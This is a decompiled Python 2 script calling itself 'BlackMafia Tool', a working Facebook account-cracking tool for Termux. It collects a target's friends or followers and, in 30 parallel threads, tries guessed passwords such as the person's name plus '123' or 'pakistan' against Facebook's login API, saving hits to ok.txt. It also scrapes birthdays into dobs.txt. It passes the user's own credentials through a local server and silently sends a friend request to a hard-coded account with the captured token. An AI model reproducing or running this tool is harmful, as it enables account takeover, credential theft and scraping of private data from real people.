# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <BlackMafia>
'''
Decrypted By Mr. Error (Azim-Vau)
'''

try:
    import os, sys, time, datetime, re, random, hashlib, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 lovehacker.py')

os.system('clear')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
    os.system('apt update && apt install nodejs -y')
if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
    os.system('apt install ruby -y && gem install lolcat')
from requests.exceptions import ConnectionError
os.system('git pull')
if not os.path.isfile('/data/data/com.termux/files/home/BlackMafiaTool/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && npm install')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\x1b[1;35mWelCome To BlackMafia Tool\x1b[0;97m'
    os.system('xdg-open https://www.facebook.com/black.mafia.xx')
    time.sleep(10)
elif os.path.isfile('/data/data/com.termux/files/home/BlackMafiaTool/...../node_modules/bytes/index.js'):
    os.system('fuser -k 5000/tcp &')
    os.system('#')
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\x1b[1;36mWelcome To BlackMafia Tool\x1b[0;97m'
    os.system('xdg-open https://www.facebook.com/black.mafia.xx')
    time.sleep(10)
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf-8')
c1 = '\x1b[1;32m'
c = '\x1b[1;35m'
c3 = '\x1b[1;36m'
c4 = '\x1b[1;33m'
c5 = '\x1b[1;34m'
c6 = '\x1b[1;37m'
c7 = '\x1b[0;97m'
c2 = '\x1b[1;31m'

def logo():
    os.system('echo -e "\n\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n ------ Your Mind is Your Best Weapon-----\n \xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a\xef\xbf\x9a" | lolcat')


def method_menu():
    os.system('clear')
    logo()
    print ''
    print '\t\x1b[1;35m WelCome To BlackMafia Tool \x1b[0;97m'
    print ''
    print '\t\x1b[1;36m[1] Cloning \x1b[0;97m'
    print '\t\x1b[1;36m[2] New Update \x1b[0;97m'
    print ''
    method_menu_select()


def method_menu_select():
    afza = raw_input('\t\x1b[1;36m Choose Options >>>\x1b[0;97m ')
    if afza == '1':
        b_menu()
    elif afza == '2':
        l_menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option \x1b[0;97m'
        print ''
        method_menu_select()


def login():
    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'FB Login Menu' + c2
    print ''
    print '[1] Token login'
    print '[2] ID/Pass login'
    print ''
    login_select()


def login_select():
    afza = raw_input(' Choose login method >>> ')
    if afza == '1':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;32mFB Token Login\x1b[0;97m'
        print ''
        token = raw_input(' Past token here : ')
        token_s = open('.fb_token.txt', 'w')
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get('https://graph.facebook.com/me?access_token=' + token)
            q = json.loads(r.text)
            name = q['name']
            nm = name.rsplit(' ')[0]
            print ''
            print '\t\x1b[1;32mToken logged in as : ' + nm + '\x1b[0;97m'
            time.sleep(3)
            method_menu()
        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mToken not valid\x1b[0;97m'
            print ''
            raw_input(' Press enter to try again ')
            login()

    elif afza == '2':
        login_fb()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        login_select()


def login_fb():
    os.system('clear')
    logo()
    print ''
    print '\t    \x1b[1;32mFB ID/PASS Login\x1b[0;97m'
    print ''
    id = raw_input(' ID/Mail/Num : ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password   : ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.fb_token.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100048514350891&access_token=' + q['loc'])
        time.sleep(1)
        print '\t    \x1b[1;32mLogged in successfully\x1b[0;97m'
        time.sleep(1)
        method_menu()
    elif 'www.facebook.com' in q['error']:
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input(' Press enter to try again ')
        login_fb()
    else:
        print '\t\x1b[1;31mID/Number/Password may be wrong\x1b[0;97m'
        print ''
        raw_input(' Press enter to try again ')
        login_fb()


def b_menu():
    global token
    os.system('clear')
    logo()
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        nm = q['name']
        nmf = nm.rsplit(' ')[0]
        ok = nmf
    except (KeyError, IOError):
        print ''
        print '\t    ' + c + 'ID has checkpoint' + c2
        print ''
        os.system('rm -rf .fb_token.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        logo()
        print ''
        print '\t    \x1b[1;31mTurn on mobile data OR wifi \x1b[0;97m'
        print ''
        time.sleep(1)
        raw_input(' Press enter to try again \x1b[0;97m')
        b_menu()

    os.system('clear')
    logo()
    print ''
    print '\t  ' + c + 'Logged In User' + ok + c2
    print ''
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print ''
    print '\t  \x1b[1;33m[1] Crack from public id \x1b[0;97m'
    print '\t  \x1b[1;35m[2] Crack from followers \x1b[0;97m'
    print '\t  \x1b[1;34m[3] View token \x1b[0;97m'
    print '\t  \x1b[1;36m[4] Find date of birth \x1b[0;97m'
    print '\t  \x1b[1;31m[5] Return method menu \x1b[0;97m'
    print '\t  \x1b[1;32m[6] Logout \x1b[0;97m'
    print ''
    b_menu_select()


def b_menu_select():
    select = raw_input('\t  \x1b[1;35mChoose Option >>>  \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Public ID Cloning " | lolcat')
        print ''
        idt = raw_input(' Put Id/user :  ')
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            os.system('echo -e "\t    Public ID Cloning " | lolcat')
            print ''
            print ' Target user : ' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    \x1b[1;31m Logged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input('\nPress enter to back ')
            b_menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Followers Cloning " | lolcat')
        print ''
        idt = raw_input(' Put Id/user : ')
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\t    Gathering Information " | lolcat')
        print ''
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            os.system('clear')
            logo()
            print ''
            os.system('echo -e "\t    Followers Cloning" | lolcat')
            print ''
            print ' Target user : ' + q['name']
        except (KeyError, IOError):
            print ''
            print '\n\t    \x1b[1;31m Logged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input('\nPress enter to back ')
            b_menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        view_token()
    elif select == '4':
        extract_dob()
    elif select == '5':
        method_menu()
    elif select == '6':
        logout()
    else:
        print ''
        print '\t    ' + c + 'Select valid method' + c2
        print ''
        b_menu_select()
    print ' Total IDs : ' + str(len(id))
    time.sleep(0.5)
    print ' The process is running in background'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '[Checkpoint] ' + uid + ' | ' + pass1
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass1 + '\x1b[1;0m'
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '[Checkpoint] ' + uid + ' | ' + pass2
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass2 + '\x1b[1;0m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '[Checkpoint] ' + uid + ' | ' + pass3
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print ' \x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass3 + '\x1b[1;0m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '[Checkpoint] ' + uid + ' | ' + pass4
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass4 + '\x1b[1;0m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786786'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '[Checkpoint] ' + uid + ' | ' + pass5
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass5 + '\x1b[1;0m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '000786'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '[Checkpoint] ' + uid + ' | ' + pass6
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass6 + '\x1b[1;0m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = 'pakistan'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '[Checkpoint] ' + uid + ' | ' + pass7
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m[Successfull] \x1b[1;30m' + uid + ' | ' + pass7 + '\x1b[1;0m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ' '
    print 47 * '-'
    print ''
    print ' Process has completed'
    print ' Total Cp/Ok : ' + str(len(cps)) + '/' + str(len(oks))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back ')
    b_menu()


def view_token():
    os.system('clear')
    logo()
    print ''
    print '\t    \x1b[1;32mLogged In Token \x1b[0;97m'
    print ''
    print ' Token : '
    os.system('cat .fb_token.txt')
    print ''
    raw_input(' Press enter to main menu ')
    b_menu()


def logout():
    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'Logout Menu' + c2
    print ''
    raw_input(' Do you really want to logout ? ')
    os.system('rm -rf .fb_token.txt')
    method_menu()


def extract_dob():
    global token
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        time.sleep(1)
        login()

    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'Extract DOB Of ID' + c2
    print ''
    print '[1] Grab from friendlist'
    print '[2] Grab from followers'
    print '[3] Grab single id'
    print '[4] Back'
    print ''
    dob_select()


def dob_select():
    select = raw_input('\n Choose Option >>> ')
    id = []
    nms = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;32mGrab DOB From Friendlist\x1b[0;97m'
        print ''
        idt = raw_input(' Put Id/user : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' Target Id : ' + q['name']
        except KeyError:
            print ''
            print '\x1b[1;31mID Not Found' + c2
            print ''
            raw_input('\nPress enter to back ')
            dob_select()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        print '\x1b[1;32m Grab DOB From Followers\x1b[0;97m'
        print ''
        idt = raw_input(' Put Id/user : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print ' Target user : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mID Not Found\x1b[0;97m'
            raw_input('\nPress enter to back ')
            dob_select()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        dob()
    elif select == '4':
        b_menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        dob_select()
    print ' Total IDs : ' + str(len(id))
    print ' The Process has started'
    print ' Note : This is for testing only'
    print ''
    print 47 * '-'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            q = requests.get('https://graph.facebook.com/' + uid + '?access_token=' + token, headers=header).text
            d = json.loads(q)
            y = d['birthday']
            print '\x1b[1;32m ' + uid + ' \x1b[1;30m ' + name + ' | ' + y + '\x1b[0;97m'
            nmb = open('dobs.txt', 'a')
            nmb.write(name + ' | ' + uid + ' | ' + y + '\n')
            nmb.close()
            nms.append(number)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' Process has completed'
    print ' Total DOB :  ' + str(len(nms))
    print ''
    print 47 * '-'
    print ''
    raw_input('\n Press enter to back ')
    extract_dob()


def dob():
    global token
    try:
        token = open('.fb_token.txt', 'r').read()
    except (KeyError, IOError):
        time.sleep(1)
        login()

    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'Find DOB Of ID' + c2
    print ''
    idt = raw_input(' Put id/user : ')
    os.system('clear')
    logo()
    print ''
    os.system('echo -e "\t   Finding DOB  " | lolcat')
    time.sleep(1)
    try:
        r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header).text
        z = json.loads(r)
        dobs = z['birthday']
    except (KeyError, IOError):
        os.system('clear')
        logo()
        print ''
        print '\t    ' + c + 'Find DOB Of ID' + c2
        print ''
        print ' DOB not found'
        print ''
        raw_input(' Press enter to try again ')
        extract_dob()

    os.system('clear')
    logo()
    print ''
    print '\t    ' + c + 'Find DOB Of ID' + c2
    print ''
    print ' Account ID : ' + idt
    print ' DOB : ' + dobs
    print ''
    print 47 * '-'
    print ''
    conf()


def conf():
    ol = raw_input(' Do you want to find again (y/n) ')
    if ol == 'y':
        dob()
    elif ol == 'n':
        extract_dob()
    else:
        b_menu()

